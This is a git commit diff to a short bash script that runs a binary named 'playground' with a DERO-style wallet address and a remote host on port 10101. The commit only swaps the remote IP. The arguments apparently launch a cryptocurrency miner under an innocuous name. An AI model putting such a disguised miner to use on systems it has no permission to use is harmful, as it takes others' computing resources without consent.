ba1c322994447db49417398954cd1cb0683098a4
mayadyu <121432755+mayadyu@users.noreply.github.com>
2023-01-15 17:21:11 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-./playground -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcqdkukzhgva8qsmeqzdn -r 178.62.28.214:10101 -p rpc
+./playground -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcqdkukzhgva8qsmeqzdn -r 64.227.43.95:10101 -p rpc
